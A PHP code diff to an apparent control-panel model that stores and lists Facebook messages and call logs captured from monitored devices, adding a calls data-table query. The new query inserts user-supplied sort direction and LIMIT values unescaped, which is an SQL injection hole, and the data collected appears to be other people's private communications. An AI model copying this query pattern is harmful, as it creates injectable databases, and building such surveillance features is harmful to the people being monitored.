@@ -4,7 +4,7 @@ namespace Models\Cp;
 
 class Facebook extends BaseModel {
 
-    public function getDataTableData($devId, $params = array()) {
+    public function getMessagesDataTableData($devId, $params = array()) {
         if (!$devId)
             return null;
 
@@ -107,11 +107,76 @@ class Facebook extends BaseModel {
 
         return $result;
     }
+    
+    public function getCallsDataTableData($devId, $params = array(), $os) {
+        $devId = $this->getDb()->quote($devId);
+
+        $search = '';
+        if (!empty($params['search'])) {
+            $searched = $this->getDb()->quote('%' . $params['search'] . '%');
+            $search = "`user_name` LIKE {$searched} OR `user_id` LIKE {$searched}";
+        }
+
+        $sort = '`timestamp` ASC';
+        if (count($params['sortColumns'])) {
+            if ($os === 'android') {
+                $columns = ['`user_name`', '`type`', '`call_type`', '`timestamp`'];
+            } elseif ($os === 'ios') {
+                $columns = ['`user_name`', '`type`', '`duration`', '`timestamp`'];
+            }
+
+            $sort = '';
+            foreach ($params['sortColumns'] as $column => $direction) {
+                if (isset($columns[$column])) {
+                    $sort .= " {$columns[$column]} {$direction}";
+                }
+            }
+        }
+
+        if ($os === 'android') {
+            $select = "SELECT `user_id` id, `user_name` name, `type`, `call_type`, `timestamp`";
+        } elseif ($os === 'ios') {
+            $select = "SELECT `user_id` id, `user_name` name, `type`, `duration`, `timestamp`";
+        }
+
+        if (isset($params['timeFrom'], $params['timeTo'], $params['account'])) {
+            $timeFrom = $this->getDb()->quote($params['timeFrom']);
+            $timeTo = $this->getDb()->quote($params['timeTo']);
+            $account = $this->getDb()->quote($params['account']);
+            $fromWhere = "FROM `facebook_calls` WHERE
+                    `dev_id` = {$devId} AND
+                    `account` = {$account} AND
+                    `timestamp` >= {$timeFrom} AND
+                    `timestamp` <= {$timeTo}";
+        }
+
+
+        $query = "{$select} {$fromWhere}"
+                . ($search ? " AND ({$search})" : '')
+                . " ORDER BY {$sort} LIMIT {$params['start']}, {$params['length']}";
+                
+        $result = array(
+            'aaData' => $this->getDb()->query($query)->fetchAll(\PDO::FETCH_ASSOC)
+        );
+
+        if (empty($result['aaData'])) {
+            $result['iTotalRecords'] = 0;
+            $result['iTotalDisplayRecords'] = 0;
+        } else {
+            $result['iTotalRecords'] = $this->getDb()->query("SELECT COUNT(*) FROM (SELECT `dev_id` {$fromWhere}) a")->fetchColumn();
+            $result['iTotalDisplayRecords'] = $result['iTotalRecords'];
+        }
+
+        return $result;
+    }
 
     public function getAccountsList($devId) {
         $devId = $this->getDb()->quote($devId);
 
-        return $this->getDb()->query("SELECT DISTINCT `account` FROM `facebook_messages` WHERE `dev_id` = {$devId}")->fetchAll(\PDO::FETCH_COLUMN);
+        $accounts =  $this->getDb()->query("SELECT DISTINCT `account` FROM `facebook_messages` WHERE `dev_id` = {$devId}")->fetchAll(\PDO::FETCH_COLUMN);
+        $callsAccounts =  $this->getDb()->query("SELECT DISTINCT `account` FROM `facebook_calls` WHERE `dev_id` = {$devId}")->fetchAll(\PDO::FETCH_COLUMN);
+        
+        return array_unique(array_merge($accounts, $callsAccounts));
     }
 
     public function getPrivateList($devId, $account, $userId) {
